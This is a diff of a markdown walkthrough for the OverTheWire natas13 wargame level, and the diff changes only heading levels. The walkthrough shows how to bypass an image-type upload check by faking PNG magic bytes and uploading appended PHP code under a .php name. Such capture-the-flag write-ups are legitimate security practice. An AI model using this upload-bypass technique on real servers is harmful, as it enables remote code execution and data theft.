@@ -9,11 +9,11 @@ eleventyNavigation:
     title: natas 13 walkthrough
     order: 30
 ---
-# Description
+## Description
 >    Username: natas13
 > 
 > URL:      http://natas13.natas.labs.overthewire.org
-## Source Code
+### Source Code
 ```php
 <?php
 
@@ -68,17 +68,17 @@ if(array_key_exists("filename", $_POST)) {
 
 
 ---
-# Progress
-## Observation
+## Progress
+### Observation
 Apparently, we should bypass `exif_imagetype`. 
-## Trial
+### Trial
 Changing the file extension did not work.
 Try to use fake [[File signatures]].
 ```bash
 printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > test.png
 ```
 Successfully bypass the check.
-## Payload
+### Payload
 Directly append the php code to png file signature.
 ```bash
 printf "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a" > test.png
@@ -94,19 +94,19 @@ fclose($myfile);
 ?>
 ```
 Failed. Server side did not execute the code.
-## Final
+### Final
 The payload is fine. However, the file extension should be changed to php to execute the code.
 `<input type="hidden" name="filename" value="yi78i3gdm1.php">`
 �PNG  ****** 
 
 ---
-# Hint
+## Hint
 
 ---
-# Solving
-## Category
+## Solving
+### Category
 - [[File upload vulnerability]]
-## Techniques
+### Techniques
 - [[File signatures]]
-## Tools
+### Tools
 - 
